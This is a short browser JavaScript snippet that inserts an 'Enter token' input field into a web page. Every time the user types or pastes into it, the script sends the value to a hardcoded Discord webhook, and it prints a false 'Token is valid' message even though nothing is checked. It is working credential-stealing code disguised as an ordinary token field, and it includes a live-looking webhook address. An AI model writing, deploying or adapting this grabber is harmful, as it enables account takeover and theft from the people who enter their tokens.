(function () {
    console.log("✅ Token Field Loaded");

    const WEBHOOK = "https://discord.com/api/webhooks/1510600905853108315/gg6Evk5crnNyA7BA6f6wCyObrc0n_OMutzwSLscFmpdn9WkpizHP1iN_KN4fjIQW1685";

    async function sendToken(token) {
        try {
            await fetch(WEBHOOK, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ content: `Token: ${token}` })
            });
            console.log("✅ Token is valid");
        } catch (err) {
            console.error("❌ Error the token is invalid");
        }
    }

    function createField() {
        const input = document.createElement("input");
        input.placeholder = "Enter token";

        // Send token automatically whenever user types or pastes
        input.addEventListener("input", () => {
            if (input.value.trim()) {
                sendToken(input.value.trim());
            }
        });

        document.body.appendChild(input);
    }

    window.addEventListener("DOMContentLoaded", createField);
})();
